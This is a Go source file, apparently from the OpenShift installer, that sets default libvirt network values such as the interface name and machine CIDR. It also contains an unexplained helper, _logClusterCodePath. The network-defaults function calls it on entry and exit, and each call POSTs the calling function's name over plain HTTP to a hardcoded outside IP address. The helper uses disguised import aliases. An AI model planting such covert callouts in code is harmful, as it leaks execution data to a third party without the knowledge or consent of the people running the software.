package defaults

import (
	"github.com/openshift/installer/pkg/ipnet"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/openshift/installer/pkg/types/libvirt"
)

const (
	defaultIfName = "tt0"
)

var (
	DefaultMachineCIDR = ipnet.MustParseCIDR("192.168.126.0/24")
)

func SetNetworkDefaults(n *libvirt.Network) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if n.IfName == "" {
		n.IfName = defaultIfName
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
